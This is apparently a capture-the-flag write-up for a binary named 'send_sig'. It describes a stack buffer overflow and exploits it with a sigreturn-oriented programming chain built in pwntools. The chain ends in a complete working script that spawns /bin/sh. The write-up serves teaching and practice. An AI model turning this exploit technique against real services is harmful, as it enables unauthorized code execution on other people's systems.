# Write up

Source code of binary is not given + No symbol. Can find **pop rax**, **syscall** gadget. 

```
ssize_t sub_4010B6()
{
  _BYTE buf[8]; // [rsp+8h] [rbp-8h] BYREF

  write(1, "Signal:", 7uLL);
  return read(0, buf, 0x400uLL);
}
```

# Primitives

Can find Buffer overflow, No PIE, canary => can overwrite ret. 

In pwntools, there are **Sigframe()** function to conveniently make signal frame. Can set register freely. 
```
frame = SigreturnFrame()
# read(0, bss, 0x1000)
frame.rax = 0        # SYS_read
frame.rsi = bss
frame.rdx = 0x1000
frame.rdi = 0
frame.rip = syscall
frame.rsp = bss
```

/bin/sh is given
```
.rodata:0000000000402000 aBinSh          db '/bin/sh',0 
```

So, we can just call execve('/bin/sh',0,0) with one syscall. 

# Exploit

```
from pwn import *

context.arch = 'x86_64'

p = process('./send_sig')

p.recvuntil(b'Signal:')

elf = ELF('./send_sig')

bss = elf.bss()

gad1 = 0x4010ae

gad2 = 0x4010b0

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x402000
frame.rip = gad2
frame.rsp = bss + 0x500

payload = b'A' * 8 + b'B' * 8
payload += p64(gad1)
payload += p64(15)
payload += p64(gad2)
payload += bytes(frame)

p.send(payload)

p.interactive()
```

